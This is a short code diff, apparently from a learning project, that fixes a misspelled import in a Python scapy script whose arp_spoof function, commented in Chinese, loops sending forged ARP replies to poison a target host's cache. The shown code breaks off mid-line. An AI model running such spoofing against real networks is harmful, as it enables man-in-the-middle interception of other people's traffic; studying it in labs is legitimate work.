@@ -8,7 +8,7 @@ from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import sendp
 from Tools import GET_IP_netifaces
 from Tools import GET_MAC_netifaces
-from ARP import APR_Request
+from ARP import ARP_Request
 from Tools.Scapy_IFACE import scapy_iface
 import time
 import signal
@@ -21,8 +21,8 @@ def arp_spoof(dst, src, ifname):  # 定义毒化方法，毒化dst，使dst相�
     ifname1 = ifname  # 攻击使用的接口名字
     psrc = GET_IP_netifaces.get_ip_address(ifname)  # 通过之前编写的方法获取本地ip地址
     hwsrc = GET_MAC_netifaces.get_mac_address(ifname)  # 获取本地mac地址
-    mac_src = APR_Request.arp_request(dst, ifname)[-1]  # 获取被攻击主机的真实mac地址
-    hwdst = APR_Request.arp_request(src, ifname)[-1]  # 获取被毒化主机的真实mac地址
+    mac_src = ARP_Request.arp_request(dst, ifname)[-1]  # 获取被攻击主机的真实mac地址
+    hwdst = ARP_Request.arp_request(src, ifname)[-1]  # 获取被毒化主机的真实mac地址
     signal.signal(signal.SIGINT, sigint_handler)  # 信号处理，接收到ctrl+c后执行sigint_handler方法
     while True:
         sendp(Ether(src=hwsrc, dst=mac_src) / ARP(op=2, hwsrc=hwsrc, psrc=src1, hwdst=mac_src, pdst=dst1),
